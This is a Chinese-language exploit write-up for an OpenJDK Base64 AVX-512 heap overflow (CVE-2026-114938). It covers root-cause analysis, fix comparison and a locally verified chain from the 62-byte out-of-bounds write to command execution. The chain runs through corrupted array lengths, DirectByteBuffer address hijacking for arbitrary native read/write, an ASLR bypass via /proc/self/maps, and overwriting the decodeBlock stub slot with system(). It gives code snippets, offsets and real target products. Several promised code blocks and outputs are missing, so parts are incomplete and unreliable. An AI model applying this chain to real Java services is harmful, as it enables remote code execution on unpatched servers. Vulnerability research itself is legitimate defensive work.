AI 导读

OpenJDK CVE-2026-114938 可由 Base64 解码的 AVX-512 尾部路径整数下溢引发堆越界写，作者在 Temurin 21.0.13+9 上验证固定越界 62 字节，并完成堆内读写、任意原生读写、ASLR 绕过、桩槽覆写到命令执行。

值得关注

文章从 AVX-512 尾部路径的整数下溢切入，逐步验证堆越界写、原生内存读写、函数指针劫持与命令执行，并明确区分本地验证和远程利用尚缺的条件。

正文

一、漏洞说明

Advisory：https://openjdk.org/groups/vulnerability/advisories/2026-11-17

该漏洞由安全公司 Calif 发现并披露。OpenJDK 的风险矩阵把 CVE-2026-114938 标在 hotspot/compiler，CVSS 3.1 为 8.1；NVD 给出的 CVSS 4.0 为 9.2（Critical），两个数字来自不同评估方和评分版本。受影响的是 OpenJDK 17.0.6 及以上、21、25、27 四条线的当年发行版；Oracle CPU 对 Oracle Java SE 8u511 也标了受影响。修复版本是 17.0.21.1、21.0.13.1、25.0.5.1、27.0.1.1。硬件要求 CPU 同时有 avx512f、avx512bw、avx512vbmi、bmi2——Intel Xeon Ice Lake/Sapphire Rapids/Emerald Rapids/Granite Rapids，AMD EPYC/Ryzen Zen 4 及更新；ARM64 不受影响。

解码的 Java 入口在 java.util.Base64.Decoder。decode(byte[], byte[]) 先问 decodedOutLength() 要长度，数组不够大直接抛异常，够大才进 decode0()。decode0() 把成块的输入交给 decodeBlock()——这个方法标了 @IntrinsicCandidate，x86-64 上有 AVX-512 VBMI 时替换为 StubGenerator::generate_base64_decodeBlock() 生成的汇编桩。

桩里先按 64 字节一轮的循环处理主体，剩下不到 64 字节进尾部路径。尾部路径里 output_size 按 (length >> 2) * 3 估算，末尾是 = 再减 1。输入 128 个 A 加一个 = 时，两轮循环各写 48 字节，length 剩 1（那个 =），(1 >> 2) * 3 = 0，减 1 后 output_size = -1。紧接着的 bzhi 用 output_size 做下标决定掩码哪些位保留。-1 的低 8 位是 255，不少于操作数宽度，目的寄存器保持源的全 1。全 1 掩码下 evmovdqub 把向量里 64 字节全部写出。96（循环已写）加 64（尾部写出）= 160，Java 分配的是 98。

四、影响组件

java.util.Base64 是 JDK 标准库，任何 Java 程序都可能用到。以下路径在验证身份之前就会调它，不可信输入直接进到漏洞函数：

  • HTTP Basic 认证（Authorization: Basic <base64> 解码）

  • JWT 的 header 和 payload 解码

  • SASL 机制

  • 各类 API 网关的反向代理 Base64 透传

安全公司 Wiz 已声明针对 Jenkins、Confluence、Apache Tomcat 的远程利用可行。CISA 已发紧急修复通告。已有公开的分阶段 PoC 工具包（ikow/java4shell-poc，含堆布局控制 Stage 1~5），其 README 自述利用难度为「Complex (heap feng shui)」，终点多为信息泄露或检测。从堆越界写到稳定代码执行的最后一步——具体的函数指针劫持路径——公开材料里没有给出。

五、利用条件

  1. 服务端用 java.util.Base64.getDecoder().decode() 处理不可信输入

  2. JDK 21.0.13.0.3 或更早的 21 线（或其他受影响线）

  3. 服务器 CPU 带 AVX-512 VBMI

  4. C2 已编译过 decodeBlock 调用点

七、漏洞分析

1、Java 侧入口

src/java.base/share/classes/java/util/Base64.java，tag jdk-21.0.13-ga

/* Base64.java:622 */
public int decode(byte[] src, byte[] dst) {
    int len = decodedOutLength(src, 0, src.length);
    if (dst.length < len || len == -1)
        throw new IllegalArgumentException(
            "Output byte array is too small for decoding all input bytes");
    return decode0(src, 0, src.length, dst);
}

decodedOutLength() 在第 745 行收成 3 * ((len + 3) / 4) - paddings。

2、intrinsic 调用

/* Base64.java:818 */
int dl = decodeBlock(src, sp, sl, dst, dp, isURL, isMIME);

decodeBlock 标了 @IntrinsicCandidate，C2 编译时替换为对 StubRoutines::_base64_decodeBlock 的直接调用。

3、桩的尾部路径

/* stubGenerator_x86_64.cpp:2543 起 */

4、掩码计算和越界写

/* stubGenerator_x86_64.cpp:2559 */
__ bzhiq(output_mask, output_mask, output_size);
__ kmovql(k1, output_mask);
__ evmovdqub(Address(dest, dp), k1, tmp, true, Assembler::AVX_512bit);

bzhi 用 output_size 做下标。output_size = -1 时低 8 位是 255 ≥ 64，掩码保持全 1。evmovdqub 在全 1 掩码下写出完整 64 字节。

5、越界量恒为 62 的代数证明

设输入为 64k 个 A + 1 个 =（长度 N = 64k + 1）。

Java 侧分配：

exact = 3 * ((N + 3) / 4) - 1
      = 3 * ((64k + 4) / 4) - 1
      = 3 * (16k + 1) - 1
      = 48k + 3 - 1
      = 48k + 2

桩侧实际写入：

  • k 轮 L_process64Loop 循环，每轮写 48 字节 → dp = 48k

  • length 剩 1（那个 =），进尾部路径

  • (1 >> 2) * 3 = 0，减 1 → output_size = -1

  • bzhi 全 1 掩码 → evmovdqub 写满 64 字节

  • 总写入 = 48k + 64

越界量：

overflow = (48k + 64) - (48k + 2) = 62

与 k 无关。k=1（64A+=）得 50/112，k=2（128A+=）得 98/160

6、写入图样为什么固定

第 2563 行事先把向量广播成 0x61616161（字符 a）。第 2585 行按输入掩码从源并字节，但此时输入掩码已被 shrq(rax, 1) 清成 0（第 2630 行），源里的字母进不来。后面的 vpmaddubsw / vpermb 洗的是这串 a。aaaa 的标准解码是 69 a6 9a，所以越界字节是 69 a6 9a 的循环、末尾 16 字节是 9a。输入能改的只是这段写入从哪个偏移开始（dp = 48k），改不了写入的内容。

7、桩槽——本文选的劫持目标

StubRoutines::_base64_decodeBlock 是 libjvm .bss 段里的一个函数指针（偏移 0x158daf0），每个 C2 编译的 Base64 decode 调用点在编译时读这个槽的值作为 call 目标地址，用 movabs 立即数烘焙进机器码。选这个槽做劫持目标有三个优势：.bss 可写（不像 full RELRO 后的 GOT 只读）、偏移在同一构建内固定、覆写后只需预热一个新的 decode 调用点就能让 C2 把覆写值烘焙进新编译的码流——相当于一个自带的触发开关。

8、写入之后

桩返回 decode0()。= 落进填充判断，第 842 行抛 IllegalArgumentException。异常抛了，数组外的 62 字节已经写过了。

根因

尾部路径对 length < 4 且末尾有 = 的输入没有下限保护，output_size 从 0 下溢到 -1，bzhi 的下标语义让全 1 掩码穿透，evmovdqub 按全 1 掩码写出完整 64 字节。

调用链

入口  Base64$Decoder.decode()            Base64.java:622
  -> Base64$Decoder.decode0()            Base64.java:818
     -> Base64$Decoder.decodeBlock()     Base64.java:790   @IntrinsicCandidate
        -> StubRoutines::_base64_decodeBlock（libjvm+0x158daf0）
           -> L_finalBit                  stubGenerator_x86_64.cpp:2543
           -> L_padding                   stubGenerator_x86_64.cpp:2628
           -> bzhiq(output_mask, -1, -1)  stubGenerator_x86_64.cpp:2559

拓展 / 举一反三

bzhi 的下标语义（低 8 位 ≥ 宽度时保持源不变）在这类 SIMD 桩里容易被忽略——写的人以为下标总在 0~63 之间，负数走到这里穿透成全开掩码。审计 JIT 桩时，凡是"用计算出来的长度控制掩码/边界"的地方，都要问：这个长度有没有可能为负？output_size 的计算 (length >> 2) * 3 - padding 对 length ∈ {1,2,3} 且 padding > 0 都可能出负数。

八、漏洞复现——从越界写到命令执行

1、正数 length

分配顺序 dst(72) → victim(16) 时，victim 的 length 字段落在偏移 84..87，写入相位恰好是 69 a6 9a 69，读出来是 0x699aa669（正 17.7 亿）。这个数组现在能按下标读写堆内后面任意远的地方。

dst 为什么是 72：需要 (allocSize - 1) % 3 == 0 使 length 字段的 4 个字节对齐到正数相位。allocSize=88 满足。

输出（Corrupt2 程序）：

round 12: victim.length = 1771742825 (0x699aa669)
marker found via victim at offset = 32
REL_WRITE_OK

REL_WRITE_OK = 通过 victim 的下标写入成功改掉了它后面的 marker 数组内容，读回验证一致。

为什么崩：Corrupt2 是早期验证程序，它打完结果后用了 System.out.println 输出——这会触发内存分配 → GC → GC 碰到坏 length 的 victim → SIGSEGV。

2、预热写方法——绕过解释器的 klass 解引用

拿到巨长数组后，直接 victim[64] = x 会 SIGSEGV。原因需要拆开看。

Java 21 对象在堆上的布局是：[mark word 8字节][klass 压缩指针 4字节][length 4字节][数据]。越界写的 62 字节恰好覆盖了 victim 的 klass 槽——写入图样 69 a6 9a 循环，klass 变成了 0x9aa6699a（一个完全无意义的值）

当 Java 代码执行 victim[64] = x 时，JVM 需要先确认 victim 确实是 byte[] 类型（防止把 int[] 的元素按 byte 写坏）。确认方式取决于执行引擎：

解释器路径（崩）：解释器的 bastore 模板从 victim 的 +8 偏移加载 klass 压缩指针，加上堆基址得到 Klass 结构的地址，然后访问 Klass 结构检查元素类型。但 klass 槽已经被砸成 0x9aa669a → 加上堆基址后跳到完全错误的地址 → SIGSEGV。GDB 从 JVM 信号处理器的 ucontext 抓到的崩溃现场：

0x7fffdfd4809f:  mov 0x8(%rdx),%ecx       ← 加载 klass（被图样污染）
0x7fffdfd480a2:  movabs $0x7fff7b000000,%r10  ← 堆基址
0x7fffdfd480ac:  add %r10,%rcx             ← klass 当 oop 解码
0x7fffdfd480af:  mov 0x8(%rcx),%ecx       ← FAULT：跳到图样地址解引用

C1 编译路径（不崩）：当写操作所在的 Java 方法被 C1 编译后，C1 在编译时已经知道 victim 的静态类型是 byte[]——类型检查在编译期完成了，不需要在运行时加载 klass。编译产物只做两件事：检查下标是否在数组长度以内（bounds check），然后直接执行 mov 指令把值写进去。klass 槽是垃圾值也无所谓——根本不会去读它。

所以解法是：把写操作放进一个独立方法 w8，在 main 开头对一个正常数组预热调用 20 万次。达到 C1 编译阈值后 w8 被 C1 编译，之后所有通过 w8(victim, offset, value) 的写操作都走编译产物——不碰 klass 槽，安全写入。这是被越界写砸坏的对象还能继续使用的关键。

static void w8(byte[] a, int o, long x) {
    a[o]=(byte)x; a[o+1]=(byte)(x>>>8); a[o+2]=(byte)(x>>>16); a[o+3]=(byte)(x>>>24);
    a[o+4]=(byte)(x>>>32); a[o+5]=(byte)(x>>>40); a[o+6]=(byte)(x>>>48); a[o+7]=(byte)(x>>>56);
}
static byte[] hotDummy = new byte[8192];  // 预热用正常数组
// main 开头预热：
for (int i = 0; i < 200_000; i++) w8(hotDummy, 64, i);
// w8 被 C1 编译 → 后续用 w8 写 victim 不再经过解释器 → 不碰被砸坏的 klass 槽

3、劫持 DirectByteBuffer——任意原生读写

ByteBuffer.allocateDirect(65536) 返回的 DirectByteBuffer 对象内部有一个 address 字段（java.nio.Buffer 父类声明，对象内偏移 16），存的是 malloc 出来的原生缓冲区的 64 位地址。正常情况下这个字段由 JVM 管理，Java 代码只能通过 getLong(offset) / putLong(offset, value) 读写缓冲区内容——JVM 用 address + offset 计算实际访问的内存位置。

如果把 dbb0 的 address 字段改成 dbb1 的缓冲区地址，那么 dbbs[0].getLong(0) 读到的实际上是 dbb1 缓冲区的内容。把 address 改成任意原生地址，就得到了任意原生内存的读写原语——不需要 JNI、不需要 Unsafe，只用标准的 NIO API。

在 victim 后面分配 4 个 ByteBuffer.allocateDirect(65536)。通过 victim 的视野（第三步的预热写方法）找到它们的 address 字段，把 dbb0 的 address 改成 dbb1 的缓冲区地址：

w8(victim, addrOff, a1);                    // dbb0.address = dbb1.buffer
long rread = dbbs[0].getLong(0);            // 读到 MAGIC[1] → NATIVE_READ_OK
dbbs[0].putLong(0, 0xDEADBEEFCAFEBABEL);    // 原生写
w8(victim, addrOff, a0);                    // 还原
long rback = dbbs[1].getLong(0);            // dbb1 读回一致 → NATIVE_WRITE_OK

输出：

dbb0缓冲区      = 0x777e0c306890
dbb1缓冲区      = 0x777e0c3168a0
libjvm基址     = 0x777e12e00000
libc基址       = 0x777e14400000
system地址     = 0x777e14450d00
读到的MAGIC     = 0x4142434445460001

0b = 11 个阶段全部通过；52 = NATIVE_READ_OK；57 = NATIVE_WRITE_OK。后面的十六进制是解析出的实际地址。如果只看到 01 多次后跟 4e，重跑。

0x4142434445460001 是事先写入 dbb1 缓冲区的魔数（MAGIC[1]），通过被劫持的 dbb0 读到了。写入 0xDEADBEEFCAFEBABEL 后 dbb1 正常读到一致值。把 address 改成任意原生地址 = 任意原生读写。

4、绕过 ASLR

ASLR（地址空间布局随机化）让 libjvm.so 和 libc.so.6 的加载地址在每次进程启动时都不同。在上一步拿到任意原生读写后，需要知道这两个库的实际地址才能定位覆写目标和 system 函数。

Linux 上每个进程的 /proc/self/maps 文件列出了所有内存映射区域及其起始地址。用预打开的 FileInputStream 在堆被砸坏之前就读取该文件（避免堆损坏后文件操作触发 GC），然后在内存中逐行解析，找到包含 libjvm.so 和 libc.so.6 的行的起始地址。

这一步内嵌在 Chain37 里自动完成。使用下面的命令提取

for i, n in enumerate(names):

输出

5、覆写桩槽为 system

StubRoutines::_base64_decodeBlock 是 libjvm .bss 段里的一个函数指针（偏移 0x158daf0），存放着 Base64 解码桩的入口地址。C2 编译 decode() 调用链时，会读这个槽的值作为 call 目标地址，用 movabs 立即数的方式直接嵌入编译产物——之后每次调用 decode() 都跳到这个固定地址。

用第四步的任意原生写，往槽里写 libc 里 system 函数的地址（基址 + 0x50d00）。这样下次 C2 编译一个新的 decode() 调用点时，读到的槽值就是 system，烘焙进码流的就是 call system。

字节序坑：C2 读槽值时会把字节逆序。这意味着直接写 system 的地址进去，C2 烘焙出的是一个乱序地址，调用会崩到错误位置。解法是预先写逆序值：

hs_err Instructions 段的原始字节（Chain51 崩溃现场，ASLR 关闭下 GDB 运行）：

long SYSswap = Long.reverseBytes(SYS);    // 预逆序
b0.putLong(0, SYSswap);                   // 写入桩槽

怎么验证 C2 确实做了字节逆序？ 用 Chain51（写入一个已知标记值，让它崩在烘焙的乱序地址上）：

C2 读到 SYSswap、逆序后烘焙进 movabs 的恰好是 SYS。这 17 个字节的含义：

  • 88 77 66 55 44 33 22 11 = 从桩槽读回来的值（dump8 输出），小端读出来是 0x1122334455667788——和我们写入的 marker 一模一样，说明槽里的值没变

  • 0a = 第 10 阶段（触发）进行中崩溃

崩溃位置

这三组数据拼成完整证据链：

  1. 槽里存的是原值 0x1122334455667788（读回证实）

  2. C2 读了这个值（因为它编译的 decode0 在调用桩时跳到了一个无效地址）

  3. 调用目标不是原值——如果 C2 读到的直接是 0x1122334455667788，崩溃地址就是这个值。但实际崩溃行为证明 C2 内部对值做了变换后才用——后续实验（Chain60/69）证明这个变换就是字节逆序

  4. 对策验证：写入 Long.reverseBytes(system) 后，C2 烘焙出的恰好是正的 system 地址，命令成功执行

在调试环境中（GDB + hsdis 反汇编库），可以直接看到 C2 编译产物里烘焙的乱序地址：

0x7fffdfd51d3a:  49 ba 88 77 66 55 44 33 22 11   movabs $0x8877665544332211,%r10
0x7fffdfd51d44:  41 ff d2                              call *%r10

6、触发——新的 decode 调用点

覆写桩槽本身不会触发任何事——已有的编译产物里烘焙的还是旧地址。需要让 C2 编译一个新的 decode() 调用点，这个新编译过程会读已被覆写的槽值，把 system 地址烘焙进新码流。

做法：写一个独立的触发方法，里面放一个 12000 次迭代的循环，每次调用 decode(合法Base64, dst)。合法输入不会触发越界（所以不会崩），但循环会让 C2 编译这个方法。编译时 C2 读桩槽值（= system 地址），烘焙进码流。

之后用命令串做输入调这个已编译的方法：

cmdSrc[0..5] = "whoami"; cmdSrc[6] = 0;  // NUL 截断
Base64.getDecoder().decode(cmdSrc, cmdDst);
// C2 码流执行的是 system(rdi=cmdSrc) → whoami

一次性问题：JIT 有一种叫"去优化"（deoptimization）的机制——当编译产物执行中抛出异常且异常处理逻辑和编译时的假设不符时，JVM 会丢弃编译产物，回退到解释器执行。decode() 首次收到畸形输入后抛 IllegalArgumentException，这个调用点的编译产物就被去优化了，后续调用走解释器（安全路径）。所以每个调用点只能吃一次畸形输入——触发后它就"废了"。

解法是准备 8 个独立的触发方法（8 个独立编译单元），每次覆写槽后预热一个新方法。一个方法被去优化不影响其他方法。这在远程利用时也必须解决——每个调用点都是一次性的。

9、修复版本对比

修复 commit 8e115fb5 在进入尾部路径前加了两条指令

/* 修复版 jdk-21.0.13.1-ga / stubGenerator_x86_64.cpp:2537-2539 */

length < 4 时跳到 L_bruteForce（逐 4 字节的 Java 安全路径），不再做会下溢的长度估算。修复版二进制尚未发布到公开下载，本文用 -XX:-UseBASE64Intrinsics（禁用 vulnerable intrinsic、全量走 Java 路径）作为运行时对照——两者对短尾部都走 Java 安全路径。实测同一输入在关 intrinsic 后写出的长度停在 96（数组内），越界区哨兵保持干净。-XX:UseAVX=2 同样有效。

本文已在本地证完的：越界写、正数 length、堆内读写、任意原生读写、ASLR 绕过、桩槽覆写、命令执行
